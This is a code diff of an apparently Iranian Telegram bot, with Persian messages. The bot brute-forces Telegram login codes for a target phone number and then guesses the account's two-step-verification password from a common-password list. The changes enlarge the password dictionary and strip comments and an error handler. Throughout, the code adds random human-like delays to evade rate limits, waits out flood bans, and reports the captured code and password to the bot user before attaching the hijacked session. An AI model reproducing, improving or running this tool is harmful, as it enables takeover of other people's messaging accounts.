@@ -14,8 +14,7 @@ from telethon.errors import (
     PhoneCodeInvalidError, 
     PhoneCodeExpiredError, 
     FloodWaitError, 
-    PhoneNumberInvalidError,
-    PhoneCodeHashInvalidError
+    PhoneNumberInvalidError
 )
 import urllib.request
 
@@ -43,6 +42,12 @@ PASSWORD_DICT = [
     "111111", "222222", "333333", "444444",
     "555555", "666666", "777777", "888888",
     "999999", "000000", "123123", "321321",
+    "iloveyou", "monkey", "dragon", "master",
+    "sunshine", "princess", "shadow", "ninja",
+    "password1", "Password1", "Passw0rd",
+    "Admin123", "admin1234", "1234", "4321",
+    "0000", "1111", "2222", "3333", "4444",
+    "5555", "6666", "7777", "8888", "9999",
 ]
 
 def load_data():
@@ -428,7 +433,6 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client = TelegramClient(StringSession(), api_id, api_hash)
         await client.connect()
         
-        # درخواست کد
         try:
             await client.send_code_request(phone)
         except PhoneNumberInvalidError:
@@ -455,7 +459,6 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_sessions[user_id]['msg_id'] = msg.message_id
         user_sessions[user_id]['phone'] = phone
         
-        # شروع حدس زدن کد با مدیریت هوشمند محدودیت‌ها
         asyncio.create_task(smart_bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg))
         
     except Exception as e:
@@ -468,7 +471,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await clear_user_session(user_id)
 
-# ============ حدس زدن هوشمند کد با مدیریت محدودیت‌ها ============
+# ============ حدس زدن هوشمند کد ============
 async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
     try:
         total_attempts = 100000
@@ -478,41 +481,27 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
         start_time = datetime.now()
         wrong_attempts = 0
         flood_wait_count = 0
-        current_wait = 0
-        session_id = str(user_id)
         
-        # استراتژی حدس هوشمند:
-        # 1. اول اعداد تصادفی رو امتحان کن (چون مردم معمولاً کدهای تصادفی میگیرن)
-        # 2. بعد اعداد رایج مثل 12345, 00000, 11111 و...
-        
-        # تولید لیست هوشمند کدها
+        # تولید لیست هوشمند کدها - اول اعداد تصادفی
         code_list = []
-        
-        # اول اعداد کاملاً تصادفی
         random_codes = set()
         while len(random_codes) < 5000:
             random_codes.add(str(random.randint(0, 99999)).zfill(5))
         
-        # بعد کدهای رایج
+        # کدهای رایج
         common_codes = [
             "12345", "00000", "11111", "22222", "33333", "44444",
             "55555", "66666", "77777", "88888", "99999",
-            "12345", "54321", "11111", "22222", "33333",
-            "44444", "55555", "66666", "77777", "88888",
-            "99999", "00000", "12345", "54321", "11223",
-            "98765", "56789", "13579", "24680", "97531"
+            "54321", "11223", "98765", "56789", "13579", "24680"
         ]
         
-        # ترکیب لیست
         final_list = list(random_codes) + common_codes
         
-        # بقیه اعداد به ترتیب
         for i in range(total_attempts):
             code = str(i).zfill(5)
             if code not in final_list:
                 final_list.append(code)
         
-        # شروع حدس
         await context.bot.edit_message_text(
             f"""
 🔍 <b>شروع حدس زدن هوشمند کد تایید...</b>
@@ -534,7 +523,6 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
         for code in final_list:
             attempt += 1
             
-            # هر 1000 تلاش یا هر 5 ثانیه یکبار پیام رو بروزرسانی کن
             if attempt % 1000 == 0:
                 elapsed = (datetime.now() - start_time).seconds
                 percent = (attempt / total_attempts) * 100
@@ -552,7 +540,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 • پیشرفت: {percent:.2f}%
 • زمان سپری شده: {elapsed} ثانیه
 • کدهای اشتباه: {wrong_attempts}
-• محدودیت‌های تلگرام: {flood_wait_count} بار
+• محدودیت‌ها: {flood_wait_count}
 • زمان تخمینی باقی‌مانده: {remaining} ثانیه
 
 ⏳ لطفاً صبر کنید...
@@ -564,13 +552,11 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                 except:
                     pass
             
-            # مدیریت هوشمند محدودیت‌ها با تاخیر تصادفی
+            # تاخیر هوشمند
             if attempt > 10 and attempt % 50 == 0:
-                # هر 50 تلاش، کمی تاخیر تصادفی برای شبیه‌سازی انسان
                 await asyncio.sleep(random.uniform(0.1, 0.5))
             
             if attempt > 100 and attempt % 200 == 0:
-                # هر 200 تلاش، تاخیر بیشتر
                 await asyncio.sleep(random.uniform(0.5, 1.5))
             
             try:
@@ -586,9 +572,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
             except FloodWaitError as e:
                 flood_wait_count += 1
                 wait_time = e.seconds
-                current_wait = wait_time
                 
-                # محاسبه زمان واقعی انتظار
                 if wait_time > 60:
                     minutes = wait_time // 60
                     seconds = wait_time % 60
@@ -606,10 +590,6 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 📊 تلاش‌ها: {attempt} از {total_attempts}
 🔄 تعداد محدودیت‌ها: {flood_wait_count}
 
-📌 <b>تکنیک مدیریت محدودیت:</b>
-• صبر کامل تا پایان زمان محدودیت
-• ادامه حدس با استراتژی جدید
-
 ⏳ لطفاً صبر کنید...
 """,
                     chat_id=update.effective_chat.id,
@@ -617,38 +597,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                     parse_mode='HTML'
                 )
                 
-                # صبر کامل تا پایان زمان محدودیت
                 await asyncio.sleep(wait_time + random.uniform(1, 3))
-                
-                # بعد از محدودیت، استراتژی رو عوض کن
-                # از اعداد تصادفی جدید استفاده کن
-                continue
-                
-            except PhoneCodeHashInvalidError:
-                await context.bot.edit_message_text(
-                    f"""
-⚠️ <b>کد هش نامعتبر!</b>
-
-📱 شماره: <code>{phone}</code>
-
-تلگرام درخواست جدیدی برای کد ارسال کرد.
-در حال ارسال درخواست مجدد...
-""",
-                    chat_id=update.effective_chat.id,
-                    message_id=msg.message_id,
-                    parse_mode='HTML'
-                )
-                try:
-                    await client.send_code_request(phone)
-                except Exception as e:
-                    await context.bot.edit_message_text(
-                        f"❌ خطا در ارسال مجدد کد: {str(e)[:200]}",
-                        chat_id=update.effective_chat.id,
-                        message_id=msg.message_id,
-                        parse_mode='HTML'
-                    )
-                    await clear_user_session(user_id)
-                    return
                 continue
                 
             except SessionPasswordNeededError:
@@ -660,7 +609,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 ✅ کد تایید پیدا شد: <code>{code}</code>
 📊 تلاش‌های کد: {attempt}
 ❌ کدهای اشتباه: {wrong_attempts}
-🔄 محدودیت‌های تلگرام: {flood_wait_count}
+🔄 محدودیت‌ها: {flood_wait_count}
 
 🔑 در حال حدس زدن پسورد 2FA...
 ⏳ لطفاً صبر کنید...
@@ -670,7 +619,6 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                     parse_mode='HTML'
                 )
                 
-                # حدس پسورد
                 password_found, pass_attempt, pass_found = await bruteforce_password_smart(
                     update, context, user_id, client, msg
                 )
@@ -724,7 +672,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 • کد پیدا شده: <code>{code}</code>
 • تلاش‌های کد: {attempt}
 • کدهای اشتباه: {wrong_attempts}
-• محدودیت‌های تلگرام: {flood_wait_count}
+• محدودیت‌ها: {flood_wait_count}
 • پسورد پیدا شده: <code>{pass_found}</code>
 • تلاش‌های پسورد: {pass_attempt}
 
@@ -766,7 +714,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                     return
                 
             except Exception as e:
-                logger.error(f"Error in bruteforce: {e}")
+                logger.error(f"Error: {e}")
                 continue
         
         if found and code_found:
@@ -819,7 +767,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 • کد پیدا شده: <code>{code_found}</code>
 • کل تلاش‌ها: {attempt}
 • کدهای اشتباه: {wrong_attempts}
-• محدودیت‌های تلگرام: {flood_wait_count}
+• محدودیت‌ها: {flood_wait_count}
 • زمان سپری شده: {elapsed} ثانیه
 
 🎯 سلف به لیست شما اضافه شد.
@@ -850,7 +798,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 📊 <b>آمار تلاش‌ها:</b>
 • کل تلاش‌ها: {attempt}
 • کدهای اشتباه: {wrong_attempts}
-• محدودیت‌های تلگرام: {flood_wait_count}
+• محدودیت‌ها: {flood_wait_count}
 • زمان سپری شده: {elapsed} ثانیه
 
 ممکن است:
@@ -888,14 +836,13 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
         start_time = datetime.now()
         flood_wait_count = 0
         
-        # اول پسوردهای رایج رو امتحان کن
+        # پسوردهای رایج
         common_passwords = [
             "123456", "password", "12345678", "qwerty", "123456789",
             "12345", "1234", "111111", "1234567890", "000000",
             "admin", "letmein", "welcome", "monkey", "dragon"
         ]
         
-        # ترکیب لیست با اولویت
         password_list = common_passwords + [p for p in PASSWORD_DICT if p not in common_passwords]
         
         await context.bot.edit_message_text(
@@ -929,7 +876,7 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
 📊 تلاش‌ها: {attempt} از {total_passwords}
 📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
 ⏱️ زمان سپری شده: {elapsed} ثانیه
-🔄 محدودیت‌های تلگرام: {flood_wait_count}
+🔄 محدودیت‌ها: {flood_wait_count}
 
 ⏳ لطفاً صبر کنید...
 """,
